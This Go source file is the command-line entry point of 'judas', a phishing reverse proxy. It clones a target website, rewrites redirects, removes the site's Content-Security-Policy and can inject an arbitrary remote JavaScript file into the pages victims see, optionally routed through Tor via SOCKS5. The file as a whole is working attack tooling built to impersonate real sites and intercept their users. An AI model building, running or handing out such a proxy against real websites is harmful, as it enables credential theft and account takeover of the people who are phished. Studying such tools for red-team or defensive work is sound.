package main

import (
	"crypto/tls"
	"crypto/x509"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"time"

	"github.com/joncooperworks/judas"
)

const (
	// DefaultTimeout is the HTTP client timeout.
	DefaultTimeout = 20 * time.Second
)

var (
	targetURL           = flag.String("target", "", "The website we want to phish.")
	address             = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
	attachProfiler      = flag.Bool("with-profiler", false, "Attach profiler to instance.")
	proxyURL            = flag.String("proxy", "", "Optional upstream SOCKS5 proxy. Useful for torification.")
	javascriptURL       = flag.String("inject-js", "", "URL to a JavaScript file you want injected.")
	insecure            = flag.Bool("insecure", false, "Listen without TLS.")
	sourceInsecure      = flag.Bool("insecure-target", false, "Not verify SSL certificate from target host.")
	proxyCACertFilename = flag.String("proxy-ca-cert", "", "Proxy CA cert for signed requests")
)

func exitWithError(message string) {
	log.Println(message)
	os.Exit(-1)
}

func setupRequiredFlags() {
	flag.Parse()
	if *address == "" {
		exitWithError("--address is required.")
	}

	if *targetURL == "" {
		exitWithError("--target is required.")
	}
}

func main() {
	setupRequiredFlags()
	log.Println("Setting target to", *targetURL)
	u, err := url.Parse(*targetURL)
	if err != nil {
		exitWithError(err.Error())
	}

	responseTransformers := []judas.ResponseTransformer{
		judas.LocationRewritingResponseTransformer{},
		judas.CSPRemovingTransformer{},
	}

	if *javascriptURL != "" {
		responseTransformers = append(responseTransformers, judas.JavaScriptInjectionTransformer{JavascriptURL: *javascriptURL})
	}

	logger := log.New(os.Stdout, "judas: ", log.Ldate|log.Ltime|log.Llongfile)

	rootCAs, _ := x509.SystemCertPool()
	if rootCAs == nil {
		rootCAs = x509.NewCertPool()
	}
	if *proxyCACertFilename != "" {
		proxyCACertFile, err := os.Open(*proxyCACertFilename)
		if err != nil {
			logger.Fatal(err)
		}
		defer proxyCACertFile.Close()

		certs, err := ioutil.ReadAll(proxyCACertFile)
		if err != nil {
			logger.Fatal(err)
		}

		if ok := rootCAs.AppendCertsFromPEM(certs); !ok {
			logger.Fatalf("failed to trust custom CA certs from %s", *proxyCACertFilename)
		}
	}

	var httpTransport http.RoundTripper = &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: *insecure,
			RootCAs:            rootCAs,
		},
	}

	if *proxyURL != "" {
		proxy, err := url.Parse(*proxyURL)
		if err != nil {
			logger.Fatal(err)
		}

		httpTransport.(*http.Transport).Proxy = http.ProxyURL(proxy)
	}

	config := &judas.Config{
		TargetURL:            u,
		ResponseTransformers: responseTransformers,
		Logger:               logger,
		Transport:            httpTransport,
	}
	phishingProxy := judas.New(config)

	if *attachProfiler {
		go func() {
			log.Println("Starting profiler.")
			log.Println(http.ListenAndServe("localhost:6060", nil))
		}()
	}

	if err != nil {
		exitWithError(err.Error())
	}
	http.HandleFunc("/", phishingProxy.HandleRequests)

	if *insecure {
		listenAddr := fmt.Sprintf("http://%s", *address)
		log.Println("Listening on:", listenAddr)
		err = http.ListenAndServe(*address, nil)
		if err != nil {
			log.Println(err)
		}
	}

}
